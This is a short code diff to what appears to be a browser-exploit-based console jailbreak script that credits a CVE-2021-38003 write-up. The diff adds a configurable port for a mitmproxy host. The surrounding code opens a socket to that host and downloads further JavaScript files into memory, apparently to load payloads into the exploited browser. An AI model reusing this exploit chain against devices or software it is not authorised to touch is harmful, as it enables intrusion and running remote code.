@@ -2,8 +2,8 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
-const ip_script = "10.0.0.2"; // MITM Proxy is handling it --> Needs to be updated
-
+const ip_script = "10.0.0.2"; // IP address of computer running mitmproxy.. MITM Proxy is handling it --> Needs to be updated
+const ip_script_port = 8080; //port which mitmproxy is running on
 // #region misc
 
 let SYSCALL = {
@@ -1244,7 +1244,7 @@ function main () {
             let fd = -1n;
             let total_received = 0;
             try {
-                sock = connectToServer(8080);       // Connect to the MITM proxy to fake a request
+                sock = connectToServer(ip_script_port);       // Connect to the MITM proxy to fake a request
                 httpGet(sock, `/js/${filename}`);
 
                 const buffer = malloc(800*1024);
